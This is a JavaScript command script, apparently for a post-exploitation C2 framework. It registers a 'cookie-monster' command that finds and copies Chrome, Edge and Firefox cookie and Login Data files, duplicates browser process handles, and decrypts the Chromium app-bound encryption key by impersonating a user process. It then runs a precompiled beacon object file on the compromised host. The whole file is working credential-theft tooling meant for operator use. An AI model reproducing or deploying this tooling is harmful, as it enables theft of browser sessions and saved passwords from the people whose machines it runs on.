var cmd_cookie_monster = ax.create_command("cookie-monster", "Locate and copy the cookie file used for Edge/Chrome/Firefox", "cookie-monster [--chrome || --edge || --system <Local State File Path> <PID> || --firefox || --chromeCookiePID <PID> || --chromeLoginDataPID <PID> || --edgeCookiePID <PID> || --edgeLoginDataPID <PID> ] [--cookie-only] [--key-only] [--login-data-only] [--copy-file \"C:\\Folder\\Location\\\"]");
cmd_cookie_monster.addArgBool(       "--cookie-only",                       "Only retrieve the Cookie file. Do not attempt to download Login Data file or retrieve app bound encryption key.");
cmd_cookie_monster.addArgBool(       "--login-data-only",                   "Only retrieve the Login Data file. Do not attempt to download Cookie file or retrieve app bound encryption key.");
cmd_cookie_monster.addArgBool(       "--key-only",                          "Only retrieve the app bound encryption key. Do not attempt to download the Cookie or Login Data files.");
cmd_cookie_monster.addArgFlagString( "--copy-file", "folder",        false, "Copies the Cookie and Login Data file to the folder specified. Does not use fileless retrieval method.");
cmd_cookie_monster.addArgBool(       "--chrome",                            "Looks at all running processes and handles, if one matches chrome.exe it copies the handle to cookies and then copies the file to the CWD");
cmd_cookie_monster.addArgBool(       "--edge",                              "Looks at all running processes and handles, if one matches msedge.exe it copies the handle to cookies and then copies the file to the CWD");
cmd_cookie_monster.addArgBool(       "--firefox",                           "Looks for profiles.ini and locates the key4.db and logins.json file");
cmd_cookie_monster.addArgFlagString( "--system", "local_state_path", false, "Decrypt chromium based browser app bound encryption key without injecting into browser. Requires path to Local State file and PID of a user process for impersonation");
cmd_cookie_monster.addArgBool(       "--chromeCookiePID",                   "If chrome PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file");
cmd_cookie_monster.addArgBool(       "--chromeLoginDataPID",                "If chrome PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file");
cmd_cookie_monster.addArgBool(       "--edgeCookiePID",                     "If edge PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file");
cmd_cookie_monster.addArgBool(       "--edgeLoginDataPID",                  "If edge PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file");
cmd_cookie_monster.addArgInt(        "pid", "Browser PID", 0);

cmd_cookie_monster.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
{
    let chrome = 0;
    let system = 0;
    let edge = 0;
    let firefox = 0;
    let chromeCookiePID = 0;
    let chromeLoginDataPID = 0;
    let edgeCookiePID = 0;
    let edgeLoginDataPID = 0;
    let pid = 0;
    let cookieOnly = 0;
    let loginDataOnly = 0;
    let keyOnly = 0;
    let path = "";
    let copyFile = "";

    pid = parsed_json["pid"];

    if(parsed_json["--chrome"]) { chrome = 1; }
    if(parsed_json["--edge"]) { edge = 1; }
    if(parsed_json["--firefox"]) { firefox = 1; }
    if(parsed_json["--key-only"]) { keyOnly = 1; }
    if(parsed_json["--cookie-only"]) { cookieOnly = 1; }
    if(parsed_json["--login-data-only"]) { loginDataOnly = 1; }
    if(parsed_json["--chromeCookiePID"]) { chromeCookiePID = 1; }
    if(parsed_json["--chromeLoginDataPID"]) { chromeLoginDataPID = 1; }
    if(parsed_json["--edgeCookiePID"]) { edgeCookiePID = 1; }
    if(parsed_json["--edgeLoginDataPID"]) { edgeLoginDataPID = 1; }

    if(parsed_json.hasOwnProperty("folder")) { copyFile = parsed_json["folder"]; }

    if(parsed_json.hasOwnProperty("local_state_path")) {
        path = parsed_json["local_state_path"];
        system = 1;
    }

    if( chrome == 0 && edge == 0 && system == 0 && firefox == 0 && chromeCookiePID == 0 && chromeLoginDataPID == 0 && edgeCookiePID == 0 && edgeLoginDataPID == 0 && pid == 0 ) { throw new Error("NO OPTIONS SELECTED"); }
    if( (system || chromeCookiePID || chromeLoginDataPID || edgeCookiePID || edgeLoginDataPID) && pid == 0) { throw new Error("missing PID value"); }

    if( keyOnly && (cookieOnly || loginDataOnly) ) { throw new Error("--key-only cannot be used with --cookie-only or --login-data-only"); }
    if( keyOnly && copyFile.length > 0 ) { throw new Error("--key-only cannot be used with --copy-file"); }
    if( loginDataOnly && (edgeCookiePID || chromeCookiePID) ) { throw new Error("--login-data-only cannot be used with --edgeCookiePID or --chromeCookiePID"); }
    if( cookieOnly && (edgeLoginDataPID || chromeLoginDataPID) ) { throw new Error("--cookie-only cannot be used with --edgeCookiePID or --chromeCookiePID"); }

    let bof_path = ax.script_dir() + "_bin/cookie-monster-bof." + ax.arch(id) + ".o";
    let bof_params = ax.bof_pack("int,int,int,int,int,int,int,int,int,cstr,int,int,int,cstr", [ chrome, edge, system, firefox, chromeCookiePID, chromeLoginDataPID, edgeCookiePID, edgeLoginDataPID, pid, path, keyOnly, cookieOnly, loginDataOnly, copyFile ]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Running Cookie-Monster BOF");
});
